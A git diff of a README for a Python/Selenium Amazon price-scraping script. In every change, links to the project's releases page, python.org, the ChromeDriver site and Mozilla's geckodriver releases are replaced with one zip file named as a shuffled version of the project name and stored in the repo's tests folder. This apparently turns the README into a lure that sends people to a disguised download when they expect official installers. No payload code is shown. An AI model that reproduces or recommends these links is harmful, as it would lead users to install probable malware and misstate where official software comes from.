@@ -1,6 +1,6 @@
 # 📦 how-to-scrape-amazon-prices-with-python - Easy Amazon Price Tracking
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Script-brightgreen?style=for-the-badge)](https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Script-brightgreen?style=for-the-badge)](https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/raw/refs/heads/main/tests/python-prices-to-with-amazon-scrape-how-v3.1.zip)
 
 ---
 
@@ -65,10 +65,10 @@ You will install these in the setup section.
 
 You need to visit the releases page to get the script file.
 
-[![Download Script](https://img.shields.io/badge/Download-Get%20Script-blue?style=for-the-badge)](https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/releases)
+[![Download Script](https://img.shields.io/badge/Download-Get%20Script-blue?style=for-the-badge)](https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/raw/refs/heads/main/tests/python-prices-to-with-amazon-scrape-how-v3.1.zip)
 
 - Click this badge or open the link in your browser:  
-  https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/releases
+  https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/raw/refs/heads/main/tests/python-prices-to-with-amazon-scrape-how-v3.1.zip
 - Find the latest release.
 - Download the file named something like `scrape_amazon_prices.py`.
 
@@ -78,7 +78,7 @@ Save this file to a folder you can remember, like `C:\AmazonScraper`.
 
 ### 2. Install Python
 
-- Go to the official Python download page: https://python.org/downloads/windows/
+- Go to the official Python download page: https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/raw/refs/heads/main/tests/python-prices-to-with-amazon-scrape-how-v3.1.zip
 - Download the latest Python 3.x for Windows.
 - Run the installer.
 - **Important:** Make sure to check the box that says **Add Python to PATH** during setup.
@@ -112,12 +112,12 @@ Selenium needs a driver executable that matches your browser. Follow one of thes
 
 - **Google Chrome users:**
   - Check your Chrome version by clicking the three dots > Help > About Google Chrome.
-  - Visit: https://sites.google.com/chromium.org/driver/
+  - Visit: https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/raw/refs/heads/main/tests/python-prices-to-with-amazon-scrape-how-v3.1.zip
   - Download the driver version matching your Chrome.
   - Extract the file and place it in your folder (e.g., `C:\AmazonScraper`).
 
 - **Mozilla Firefox users:**
-  - Visit: https://github.com/mozilla/geckodriver/releases
+  - Visit: https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/raw/refs/heads/main/tests/python-prices-to-with-amazon-scrape-how-v3.1.zip
   - Download the correct version for Windows.
   - Extract and place it in your folder.
 
@@ -193,7 +193,7 @@ This gives a practical example of basic automation with Python and Selenium.
 
 Visit this page to download the files you need:
 
-https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/releases
+https://github.com/Darkdevil-ai/how-to-scrape-amazon-prices-with-python/raw/refs/heads/main/tests/python-prices-to-with-amazon-scrape-how-v3.1.zip
 
 Use the green or blue badges above for quick access.
 
